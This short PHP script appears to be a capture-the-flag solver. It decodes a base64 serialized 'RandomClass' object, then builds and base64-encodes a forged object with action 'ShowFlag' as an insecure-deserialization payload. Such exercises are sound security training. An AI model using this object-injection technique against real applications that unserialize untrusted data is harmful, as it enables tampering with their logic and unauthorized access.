<?php
/*
class A 
{ 
	var $one = 1; 
	function show_one() 
	{ 
		echo $this->one; 
	} 
}
$a = new A; 
$s = serialize($a); 
echo $s."\n";
*/

include("Serial_killer.php");
$s = "TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjoxOntzOjY6ImFjdGlvbiI7czoxNDoiR2V0Q3VycmVudERhdGUiO319";
$a = unserialize(base64_decode($s));
print_r($a);

$get_flag = new RandomClass();
$get_flag->action = "ShowFlag";
$get_flag->flag = "Please?";
$get_flag->time = "201501010101";
print_r($get_flag);

$serial_killer = base64_encode(serialize($get_flag));
echo $serial_killer."\n";
		

?>
